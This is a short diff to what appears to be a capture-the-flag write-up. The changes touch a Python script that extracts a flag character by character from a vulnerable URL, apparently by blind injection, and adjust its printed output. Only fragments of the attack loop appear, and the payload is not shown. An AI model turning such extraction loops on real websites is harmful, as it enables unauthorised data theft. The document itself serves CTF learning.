@@ -22,7 +22,7 @@ def get_length(s, url) -> int:
         page = s.get(urlVuln).text
 
         if page.find('Amethyst') != -1:
-            print(n)
+            print('Length : ', n)
             return n
 
 def get_flag(s, url, char, length) -> str:
@@ -33,7 +33,7 @@ def get_flag(s, url, char, length) -> str:
             urlVuln = url + payload
 
             page = s.get(urlVuln).text
-            
+
             if page.find('Amethyst') != -1:
                 flag += c
                 print(flag)
@@ -49,6 +49,7 @@ print(flag)
 <p> And we get the flag ! </p>
 
 ```
+Length : 61
 nb
 nbc
 nbct
